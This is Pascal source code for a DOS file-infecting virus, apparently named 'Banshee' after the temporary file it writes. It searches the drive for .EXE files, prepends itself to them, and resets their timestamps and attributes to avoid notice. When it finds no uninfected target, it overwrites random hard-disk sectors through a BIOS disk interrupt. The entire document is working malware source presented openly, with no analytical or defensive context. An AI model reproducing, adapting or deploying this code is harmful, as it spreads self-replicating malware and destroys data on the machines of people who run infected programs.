{
Parasitic Non-Resident Exe Infector
Undetectable
Compressed
Smash Sectors
}

{$A+,B-,D-,E-,F-,G+,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X+,Y-}
{$I-}
{$M 2048,0,0}
Uses Dos;
Const V_Size=4348;
      Maxsize=63535-V_Size;
Var K,Time:Longint;
    Attr:Word;
    Nome,Nome2:String[80];
    Arquivo:Array[1..2]Of File;
    Buffer:Array[1..Maxsize] Of Byte;
    Buffer2:Array[1..V_Size] Of Byte;

Procedure Damage;
Var R:Registers;
Begin
  R.Es:=Seg(Buffer);
  R.Bx:=Ofs(Buffer);
  R.Ah:=3;
  R.Dl:=128;
  R.Dh:=Random(15);
  R.Ch:=Random(1000);
  R.Cl:=Random(17);
  R.Al:=01;
  Intr($13,R);
End;

Function Fileinfect(Filename: String): Boolean;
Var Flag:Boolean;
    Arquivo1:File Of Char;
    Ch:Char;
Begin
  Assign(Arquivo1, Filename);
  Reset(Arquivo1);
  K:=Filesize(Arquivo1)-1;
  Seek(Arquivo1,K);
  Read(Arquivo1,Ch);
  Flag:=(Ord(Ch)=$Ff);
  Close(Arquivo1);
  Fileinfect:=Flag;
End;

Function Peganome:String;
Var Nov_Cam:String[100];
    Pnome:String;
  Procedure Proc1;
  Var Extensao:String[3];
      Caminho:String[100];
      Search:Searchrec;
  Begin
    Findfirst(Nov_Cam+'*.*',Anyfile,Search);
    While Doserror=0 Do Begin
      If(Search.Name<>'.')And(Search.Name<>'..')Then Begin
        Extensao:=Copy(Search.Name,Pos('.',Search.Name)+1,3);
        Nome:=Nov_Cam+Search.Name;
        If(Extensao='Exe')And(Not(Fileinfect(Nome)))And(Search.Size<Maxsize)Then Pnome:=Nome;
        If (Search.Attr=16) Then Begin
          Caminho:=Nov_Cam;
          Nov_Cam:=Nov_Cam+Search.Name + '\';
          Proc1;
          Nov_Cam:=Caminho;
        End;
      End;
    Findnext(Search);
    End;
  End;
Begin
  Pnome:='';
  Nov_Cam:='\';
  Proc1;
  Peganome:=Pnome;
End;

Begin
  Nome2:=Paramstr(0);
  Nome:=Peganome;
  If Nome<>'' Then Begin
    Assign(Arquivo[1],Nome2);
    Assign(Arquivo[2],Nome);
    Getfattr(Arquivo[2],Attr);
    Setfattr(Arquivo[2],Archive);
    Reset(Arquivo[2],1);
    Getftime(Arquivo[2],Time);
    K:=Filesize(Arquivo[2]);
    Blockread(Arquivo[2],Buffer,K);
    Reset(Arquivo[1],1);
    Blockread(Arquivo[1],Buffer2,V_Size);
    Rewrite(Arquivo[2],1);
    Blockwrite(Arquivo[2],Buffer2,V_Size);
    Blockwrite(Arquivo[2],Buffer,K);
    Buffer[1]:=$Ff;
    Blockwrite(Arquivo[2],Buffer,1);
    Setftime(Arquivo[2],Time);
    Close(Arquivo[2]);
    Close(Arquivo[1]);
    Setfattr(Arquivo[2],Attr);
  End Else Damage;
  Assign(Arquivo[1],Nome2);
  Assign(Arquivo[2],'~Banshee.Exe');
  Reset(Arquivo[1],1);
  Rewrite(Arquivo[2],1);
  Seek(Arquivo[1],V_Size);
  K:=Filesize(Arquivo[1])-V_Size;
  Blockread(Arquivo[1],Buffer,K);
  Blockwrite(Arquivo[2],Buffer,K-1);
  Close(Arquivo[2]);
  Close(Arquivo[1]);
  Nome2:='';
  For K:=1 To Paramcount Do Nome2:=Nome2+Paramstr(K)+' ';
  Exec('~Banshee.Exe',Nome2);
  Rewrite(Arquivo[2]);
  Erase(Arquivo[2]);
End.
